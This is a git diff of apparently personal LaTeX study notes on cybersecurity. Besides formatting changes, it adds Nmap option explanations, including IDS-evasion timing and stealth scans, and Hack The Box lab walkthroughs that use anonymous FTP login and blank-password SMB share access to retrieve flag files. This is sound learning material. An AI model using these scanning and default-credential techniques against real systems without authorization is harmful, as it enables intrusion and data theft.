@@ -2,34 +2,25 @@
 \input{preamble}
 
 \usepackage{minted}
-\usemintedstyle{pastie}
-\definecolor{bashcodebg}{rgb}{0.85,0.85,0.85}
+\usemintedstyle{vs}
 
-%% https://tex.stackexchange.com/questions/173850/problem-in-adding-a-background-color-in-a-minted-environment
-%% fix the minted@colorbg environment
-\makeatletter
-\renewenvironment{minted@colorbg}[1]
- {\def\minted@bgcol{#1}%
-  \noindent
-  \begin{lrbox}{\minted@bgbox}
-  \begin{minipage}{\linewidth-2\fboxsep}}
- {\end{minipage}%
-  \end{lrbox}%
-  \setlength{\topsep}{\bigskipamount}% set the vertical space
-  \trivlist\item\relax % ensure going to a new line
-  \colorbox{\minted@bgcol}{\usebox{\minted@bgbox}}%
-  \endtrivlist % close the trivlist
- }
-\makeatother
-\newminted[bash]{bash}{texcl=true, bgcolor=bashcodebg}
-%\newminted[bash]{bash}{linenos=true, texcl=true, bgcolor=bashcodebg}
+\definecolor{bg}{rgb}{0.85,0.85,0.85}
+\setmintedinline{bgcolor=bg}
+\newcommand{\bashinline}[1]{\mintinline{bash}{#1}}
+%\newenvironment{bash}{\VerbatimEnvironment\begin{minted}[bgcolor=bg]{bash}}{\end{minted}}
 
-\newcommand{\bashinline}[1]{%
-\colorbox{bashcodebg}{%
-\parbox[b][0.6em]{\widthof{\mintinline{coq}{#1}}}{\mintinline{coq}{#1}}%
-}%
+\usepackage{tcolorbox}
+\tcbuselibrary{minted,skins}
+\newtcblisting{bash}{
+  listing engine=minted,
+  colback=bg,
+  colframe=black!70,
+  listing only,
+  minted style=vs,
+  minted language=bash,
+  minted options={texcl=true},
+  left=1mm,
 }
-
 
 \title{\Huge{\textbf{CyberSec}}}
 \author{Mateus Marques}
@@ -203,6 +194,40 @@ sudo journalctl
 
 \pagebreak
 
+\section{Nmap}
+
+Option \bashinline{-A} enables OS and version detection, script scanning and traceroute (it stands for aggressive).
+
+\n
+
+Option \bashinline{-T4} is for faster execution.
+
+\n
+
+You can specify them with the \bashinline{-T} option and their number (0–5) or their name. The template names are paranoid (0),
+sneaky (1), polite (2), normal (3), aggressive (4), and insane (5). The first two are for IDS evasion. Polite mode slows down the scan to use less bandwidth and target machine resources. Normal mode is the default and
+so \bashinline{-T3} does nothing. Aggressive mode speeds scans up by making the assumption that you are on a reasonably fast and reliable network. Finally insane mode assumes that you are on an extraordinarily fast network or are
+willing to sacrifice some accuracy for speed.
+
+\n
+
+Option \bashinline{-p} is to specify port ranges.
+
+\n
+
+Option \bashinline{-sV} is to determine service/version info on open ports.
+
+\n
+
+Look at \bashinline{-sS}. It says it performs a stealthy scan.
+
+Example:
+\begin{bash}
+nmap -A -T4 -sV "10.129.15.46"
+\end{bash}
+
+\pagebreak
+
 \section{HackTheBox}
 
 \subsection{Meow}
@@ -221,6 +246,92 @@ What username is able to log into the target over telnet with a blank password?
 \begin{bash}
 telnet -l root "10.129.74.130" 23
 cat flag.txt
+\end{bash}
+
+\subsection{Fawn}
+
+What does the 3-letter acronym FTP stand for? File Transfer Protocol.
+
+Which port does the FTP service listen on usually? Port 21.
+
+What acronym is used for the secure version of FTP? \bashinline{sftp}.
+
+From your scans, what version is FTP running on the target? \bashinline{vsftpd 3.0.3}.
+
+From your scans, what OS type is running on the target? Unix.
+
+What is username that is used over FTP when you want to log in without having an account? From the scan:
+\begin{bash}
+nmap -sV -A -T4 10.129.15.46
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
+\end{bash}
+
+The output \bashinline{ftp-anon} is a \href{https://nmap.org/nsedoc/scripts/ftp-anon.html}{script} from \bashinline{nmap}. It checks if the FTP running service allows for anonymous login.
+
+From GitHub \href{https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt}{Default-Credentials}, we see \bashinline{anonymous:anonymous}.
+
+What is the response code we get for the FTP message ``Login successful''? 230.
+\begin{bash}
+ftp "10.129.15.46"
+Name (10.129.15.46:sekai): anonymous
+331 Please specify the password.
+Password: anonymous
+230 Login successful.
+\end{bash}
+
+What is the command used to download the file we found on the FTP server? \bashinline{get}.
+\begin{bash}
+ftp> ls
+ftp> get flag.txt
+\end{bash}
+
+\subsection{Dancing}
+
+What does the 3-letter acronym SMB stand for? Server Message Block.
+
+What port does SMB use to operate at? Port 445 (or 139, NetBIOS).
+\begin{bash}
+nmap -sV -A -T4 10.129.71.114
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Host script results:
+| smb2-time:
+|   date: 2024-03-21T18:12:02
+|_  start_date: N/A
+|_clock-skew: 3h59m59s
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+\end{bash}
+
+What is the service name for port 445 that came up in our scan? \bashinline{microsoft-ds}.
+
+What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?
+\begin{bash}
+sudo pacman -S smbclient
+smbclient -L 10.129.71.114
+Password: (empty)
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        WorkShares      Disk
+\end{bash}
+
+What is the name of the share we are able to access in the end with a blank password? WorkShares.
+
+
+\begin{bash}
+smbclient -N //10.129.71.114/Workshares
+smb: \> ls
+smb: \> cd James.P
+smb: \> get flag.txt
 \end{bash}
 
 \end{document}
